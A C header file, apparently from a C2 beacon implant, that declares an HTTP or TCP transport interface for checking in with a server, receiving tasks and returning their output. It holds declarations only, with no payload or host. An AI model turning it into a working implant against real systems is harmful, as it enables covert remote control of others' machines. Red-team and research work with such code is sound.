#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <stdint.h>
#include <stddef.h>
#include "beacon.h"

#ifdef TRANSPORT_HTTP
#include "http.h"
#define transport_init http_transport_init
#define transport_send_metadata http_transport_send_metadata
#define transport_receive_tasks http_transport_receive_tasks
#define transport_send_output http_transport_send_output
#define transport_cleanup http_transport_cleanup
#elif defined(TRANSPORT_TCP)
#include "tcp.h"
#define transport_init tcp_transport_init
#define transport_send_metadata tcp_transport_send_metadata
#define transport_receive_tasks tcp_transport_receive_tasks
#define transport_send_output tcp_transport_send_output
#define transport_cleanup tcp_transport_cleanup
#else
#error "No transport type defined! Use -DTRANSPORT_HTTP or -DTRANSPORT_TCP"
#endif

// Transport interface for C2 communication

// Initialize transport
int transport_init(beacon_state_t *state);

// Send metadata to server (initial check-in)
int transport_send_metadata(beacon_state_t *state, const uint8_t *data, size_t len);

// Receive tasks from server
// Returns 0 on success, -1 on error
// *tasks will be allocated and must be freed by caller
int transport_receive_tasks(beacon_state_t *state, uint8_t **tasks, size_t *tasks_len);

// Send task output back to server
int transport_send_output(beacon_state_t *state, const uint8_t *data, size_t len);

// Cleanup transport resources
void transport_cleanup(void);

#endif // TRANSPORT_H
